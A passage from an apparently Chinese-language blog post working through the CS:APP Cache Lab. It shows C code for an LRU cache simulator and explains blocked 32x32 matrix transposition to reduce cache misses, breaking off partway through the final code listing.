 cache_line *cls = (cache_line *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        <span class="comment">// initialize</span></span><br><span class="line">        <span class="built_in">memset</span>(cls, <span class="number">0</span>, <span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        sets[i].lines = cls;</span><br><span class="line">    &#125;</span><br><span class="line">    sys_cache-&gt;sets = sets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * check是否命中</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检测的set</span></span><br><span class="line"><span class="comment"> * @param p    系统参数</span></span><br><span class="line"><span class="comment"> * @param tag  地址中的tag</span></span><br><span class="line"><span class="comment"> * @param cl_idx   如果命中,cl_idx表示当前命中的cacheline在set的中位置(从0开始索引)</span></span><br><span class="line"><span class="comment"> *                 如果未命中,cl_idx = -1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_if_hit</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[i].tag == tag) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span> check_if_hit和check_has_non_block可以做成一个函数,不过这里不考虑效率问题,所以就这样分了</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检验 这组set中,是否还有空block</span></span><br><span class="line"><span class="comment"> * @param cache_set  待检验的set</span></span><br><span class="line"><span class="comment"> * @param p  系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx  如果有空块,则cl_idx=找到的第一个空块</span></span><br><span class="line"><span class="comment"> *                如果没有空块,cl_idx=-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_has_empty_block</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache_set-&gt;lines[i].valid) &#123;</span><br><span class="line">            *cl_idx = i;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 采用LRU算法找到需要evict的cache line索引</span></span><br><span class="line"><span class="comment"> * Note: 本函数假设当前set中没有空块</span></span><br><span class="line"><span class="comment"> * @param cache_set 需要检查的set</span></span><br><span class="line"><span class="comment"> * @param p     系统参数</span></span><br><span class="line"><span class="comment"> * @param cl_idx cl_idx = 找到的cache line在set中的索引</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_evict_cache_line</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">size_t</span> *cl_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line">    <span class="keyword">int</span> min_age_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">1</span>; i &lt; E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_set-&gt;lines[min_age_idx].age &gt; cache_set-&gt;lines[i].age) &#123;</span><br><span class="line">            min_age_idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *cl_idx = min_age_idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * load 操作</span></span><br><span class="line"><span class="comment"> * @param cache_set</span></span><br><span class="line"><span class="comment"> * @param tag</span></span><br><span class="line"><span class="comment"> * @param age</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_load</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="comment">// 首先看能否hit</span></span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,查看是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 有空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;valid = <span class="number">1</span>;</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 未命中,没有空块</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// ecvit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_line *cl = &amp;cache_set-&gt;lines[cl_idx];</span><br><span class="line">        cl-&gt;tag = tag;</span><br><span class="line">        cl-&gt;age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_store</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx;</span><br><span class="line">    <span class="comment">// 是否hit</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 命中</span></span><br><span class="line">    &#123;</span><br><span class="line">        hits++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 是否有空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// 空块</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evcit</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) <span class="comment">// evcit</span></span><br><span class="line">    &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        evicts++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_modify</span><span class="params">(<span class="built_in">set</span> *cache_set, param *p, <span class="keyword">int</span> tag, <span class="keyword">int</span> age)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> verbose = p-&gt;v;</span><br><span class="line">    <span class="keyword">size_t</span> cl_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// hit?</span></span><br><span class="line">    check_if_hit(cache_set, p, tag, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// hit , 之后的store也会hit</span></span><br><span class="line">        hits += <span class="number">2</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 空块</span></span><br><span class="line">    check_has_empty_block(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// 首先load</span></span><br><span class="line">        cache_set-&gt;lines[cl_idx].valid = <span class="number">1</span>;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// 再store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evict</span></span><br><span class="line">    find_evict_cache_line(cache_set, p, &amp;cl_idx);</span><br><span class="line">    <span class="keyword">if</span> (cl_idx != <span class="number">-1</span>) &#123;</span><br><span class="line">        miss++;</span><br><span class="line">        DEBUG_MISS(verbose);</span><br><span class="line">        <span class="comment">// evict</span></span><br><span class="line">        DEBUG_EVICT(verbose);</span><br><span class="line">        evicts++;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].tag = tag;</span><br><span class="line">        cache_set-&gt;lines[cl_idx].age = age;</span><br><span class="line">        <span class="comment">// store</span></span><br><span class="line">        hits++;</span><br><span class="line">        DEBUG_HIT(verbose);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟仿真</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> * @param trace_item</span></span><br><span class="line"><span class="comment"> * @param item_num</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate</span><span class="params">(cache *sys_cache, param *p, trace_item *trace_items, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> item_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> s = p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> b = p-&gt;b;</span><br><span class="line"><span class="comment">//    const int E = p-&gt;E;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> tag_bit = OS_PTR_LEN - s - b;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造set tag mask</span></span><br><span class="line">    <span class="comment">// set mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> set_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        set_mask = set_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// tag mask</span></span><br><span class="line">    <span class="keyword">address64_t</span> tag_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tag_bit - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        tag_mask = tag_mask &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; item_num; i++) &#123;</span><br><span class="line">        trace_item item = trace_items[i];</span><br><span class="line">        <span class="keyword">address64_t</span> addr = item.addr;</span><br><span class="line">        op_mode mode = item.mode;</span><br><span class="line"><span class="comment">//        int access_size = item.access_size;     // useless</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step1: 得到set 和 tag</span></span><br><span class="line">        <span class="keyword">int</span> set_idx = addr &gt;&gt; b &amp; set_mask;</span><br><span class="line">        <span class="keyword">int</span> tag = addr &gt;&gt; (b + s);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// step2: 根据操作码来决定具体实施什么样的操作</span></span><br><span class="line">        <span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">            <span class="keyword">case</span> L:</span><br><span class="line">                do_load(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> M:</span><br><span class="line">                do_modify(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> S:</span><br><span class="line">                do_store(&amp;sys_cache-&gt;sets[set_idx], p, tag, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 系统输入参数</span></span><br><span class="line">    param sys_param;</span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    <span class="keyword">size_t</span> trace_item_len = <span class="number">10</span>;</span><br><span class="line">    trace_item *trace_items = (trace_item *) <span class="built_in">malloc</span>(trace_item_len * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">    <span class="comment">// 系统cache</span></span><br><span class="line">    cache sys_cache;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析参数</span></span><br><span class="line">    ret = parse_input_params(argc, argv, &amp;sys_param);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse input params failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解析trace file</span></span><br><span class="line">    ret = parse_trace_file(&amp;trace_items, &amp;trace_item_len, sys_param.t);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parse trace file failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化系统cache</span></span><br><span class="line">    init_cache(&amp;sys_cache, &amp;sys_param);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 开始仿真</span></span><br><span class="line">    simulate(&amp;sys_cache, &amp;sys_param, trace_items, trace_item_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    printSummary(hits, miss, evicts);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-第二部分–编写cache友好代码"><a href="#2-第二部分–编写cache友好代码" class="headerlink" title="2. 第二部分–编写cache友好代码"></a>2. 第二部分–编写cache友好代码</h2><p>本题能加强学生对cache的认识，编写cahce友好的代码。原题很简单，就是给一个矩阵A，求其转置。但是有一些额外说明，具体请读writeup。下面是本题的答案要求：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729141941145.png" alt="image-20200729141941145"></p><p>m，代表miss次数。</p><p>本题核心点：</p><ol><li>加强理解直接相联映射</li><li><strong>理解blocking（分块）机制带来的时间局部性提升</strong></li></ol><p>重点：<strong>blocking机制</strong>，一定要理解blocking，请参照： <span class="exturl" data-url="aHR0cDovL2NzYXBwLmNzLmNtdS5lZHUvcHVibGljL3dhc2lkZS93YXNpZGUtYmxvY2tpbmcucGRm" title="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf<i class="fa fa-external-link"></i></span></p><p>在正式解题前，先说下系统的一些参数，最重要的就是cache的组织方式了：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729142729751.png" alt="image-20200729142729751"></p><p>s=5, S=32, 即32组</p><p>E=1， 即每组一个cacheline</p><p>b=5，B=32， 即一个cacheline的block大小为32字节（后面简称cacheline大小为32字节，实际说的是cacheline内部的block大小）</p><p>blocking机制运用到矩阵转置来，即将A分成多个行条带，A行条带扫描。B分为多个块，每个块由多个条带组成，每个B条带按照列扫描。如图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144043920.png" alt="image-20200729144043920"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729144439379.png" alt="image-20200729144147785"></p><h3 id="1-32x32"><a href="#1-32x32" class="headerlink" title="1. 32x32"></a>1. 32x32</h3><p>一个cacheline 32字节， 一个int 4字节， 则一个cacheline可以放8个int， 矩阵为32x32， 则矩阵一行需要4个cacheline。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729143603293.png" alt="image-20200729143546012"></p><p>现在的问题是如何确定条带的长度。 </p><p>我们知道cpu一次read，都会load一个cache line到cache中。一个cacheline是32字节。如何将条带设置低于32字节，比如12字节，那么32字节中会有20字节无法利用，浪费了一半的cache。如果大于32字节，那扫描一个条带就会触发至少2次load。那是不是设置成32字节就好了？也不是，我们还要考虑A，B的load，store交替过程中，会造成cacheline的overlap（冲突不命中）。为了让你理解这个概念，先看以下面这道题：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145230952.png" alt="image-20200729145230952" style="zoom:50%;" /><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729145241517.png" alt="image-20200729145241517" style="zoom:50%;" /><p>现在回到我们的题目，我们想要cacheline的利用率高，又不想发生太多cacheline的冲突不命中。观察到在32x32的矩阵中，<strong>每8行重复一个cache空间。</strong>如果一个条带为32字节，即8个矩阵元素，刚好对应了一个cache line大小。所以我们可以设置， A的行扫描条带为8个元素， B的列扫描条带为8个元素，那一个块的宽度呢？显然一个cacheline是32字节，刚好也是8个元素，宽度为8肯定利用率高。</p><p>最终决定的参数：</p><ol><li>A行条带 8元素</li><li>B中一个块的大小为8x8</li></ol><p><strong>另外，miss数计算会在之后给出。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> 这里采用4循环是为了更好理解“blocking”机制，其实采用3个循环就能做，具体是融合j和k</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k,q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    B[i + q][k] = A[k][i + q];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写，miss数是300多，而满分要求miss数&lt;300. 继续分析，什么导致了多余的miss？</p><p>cachelab的writeup中，有这样一句话：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200729150322560.png" alt="image-20200729150322560"></p><p>对角线？ 是的，对角线上的元素，会发生冲突不命中问题。究其根本，在于我们对A进行了反复读。如何解决？把A的数据放到寄存器就行了。再次回到write u中：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d3314195aa594512d18.png"></p><p>题目要求我们最多不能定义12个局部变量，上述代码仅仅4个。我们还有8个变量没用，最终的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief block size 8</span></span><br><span class="line"><span class="comment"> * miss计算:</span></span><br><span class="line"><span class="comment"> * BSIZE 8， 总共分为了16块， 假设块编号从0开始，由左向右，由上向下。</span></span><br><span class="line"><span class="comment"> * 则左边第一列块中的每一块（块编号为0,4,8,12)miss数为(9+7+7)：</span></span><br><span class="line"><span class="comment"> * 1.第1个9代表 load A的第一个条带(1个miss)+ store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2.第2个7代表 load A的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 3.第3个7代表，store B的剩余7列带来的miss</span></span><br><span class="line"><span class="comment"> * 具体可参见文件： m32n32-23miss</span></span><br><span class="line"><span class="comment"> * 所以这4个块总miss为：4*(9+7+7) = 92</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 上述说完了最靠左边的一列block，还剩3列block，3*4 = 12个block</span></span><br><span class="line"><span class="comment"> * 这些block的共性就是 load A条带不会和Store A条带冲突。</span></span><br><span class="line"><span class="comment"> * 所以扫描完一个block会造成的miss为8+8：</span></span><br><span class="line"><span class="comment"> * 1. 第一个8代表，store B的第一个条带（8个miss）</span></span><br><span class="line"><span class="comment"> * 2. 第二个8代表， load 8个A条带带来的miss</span></span><br><span class="line"><span class="comment"> * 所以这12个块总miss为： 12*(8+8) = 192</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-16miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 另外还有3个固定的额外开销，具体对应哪个cache miss未知，猜测为初始化循环变量带来的（不过又觉得应该不是，如果你知道，还请告诉我）</span></span><br><span class="line"><span class="comment"> * 具体可参见文件：m32n32-extra-miss</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 所以最终的miss为:</span></span><br><span class="line"><span class="comment"> * 92+192+3 = 287</span></span><br><span class="line"><span class="comment"> * @param A </span></span><br><span class="line"><span class="comment"> * @param B </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> trans32_v1_desc[] = <span class="string">&quot;trans32_v1_desc&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans32_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">32</span>][<span class="number">32</span>], <span class="keyword">int</span> B[<span class="number">32</span>][<span class="number">32</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 8</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 避免对角线的 A B矩阵cacheline竞争</span></span><br><span class="line">                t0 = A[k][i + <span 